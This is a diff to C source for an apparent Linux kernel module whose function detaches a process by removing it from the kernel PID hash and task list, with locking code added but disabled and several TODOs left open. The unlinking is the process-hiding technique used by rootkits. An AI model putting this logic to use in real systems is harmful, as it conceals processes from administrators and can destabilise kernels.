@@ -1,8 +1,10 @@
-#include <linux/fs.h>
+#include <linux/fs.h> // vfs_write
 #include <asm/segment.h>
 #include <asm/uaccess.h>
 #include <linux/buffer_head.h>
 #include <linux/pid.h>
+// #include <linux/rwlock.h> // write_lock_irq()
+#include <linux/sched.h>  // tasklist_lock
 
 #if 0
 #include <linux/kernel.h>
@@ -190,12 +192,22 @@ Status lkm_deactivate_pid( struct task_struct *task_ptr )
     // detach_pid is not exported within kernel
     // detach_pid( task_ptr, PIDTYPE_PID );
 
-    // TODO - acquire write lock for tasklist_lock
+#if 0
+    // TODO - acquire write lock for tasklist_lock - http://lxr.free-electrons.com/source/kernel/exit.c#L180
+    write_lock_irq(&tasklist_lock);
+    
     // TODO - disable CPU interrupts
-    // TODO - mark process as uninterruptible and unschedulable - removes from run queue?
+    // spin_lock_irqsave()
 
-    // TODO - remove process from run queue
-    // del_from_runqueue();
+    // TODO - mark process as uninterruptible and unschedulable - removes from run queue?
+    set_task_state( task_ptr, TASK_UNINTERRUPTIBLE );
+
+    // remove process from run queue
+    // http://lxr.free-electrons.com/source/include/linux/sched.h?v=2.4.37#L899
+    // del_from_runqueue( task_ptr );
+#endif
+
+
 
     // remove from pid hash
     status = lkm_remove_from_pidhash( task_ptr );
@@ -203,11 +215,15 @@ Status lkm_deactivate_pid( struct task_struct *task_ptr )
     // remove from task list
     status = lkm_remove_from_list( task_ptr );
 
+#if 0
     // TODO - release write lock
+    write_unlock_irq(&tasklist_lock);
+#endif
 
     return ERROR;
 
 }
+
 
 Status lkm_remove_from_pidhash( struct task_struct *task_ptr )
 {
@@ -218,7 +234,7 @@ Status lkm_remove_from_pidhash( struct task_struct *task_ptr )
     int tmp = 0;
 
     hlist_del_rcu( &(link_ptr->node) );
-    link->pid = NULL;
+    link_ptr->pid = NULL;
 
     for (tmp = PIDTYPE_MAX; --tmp >= 0; )
     {
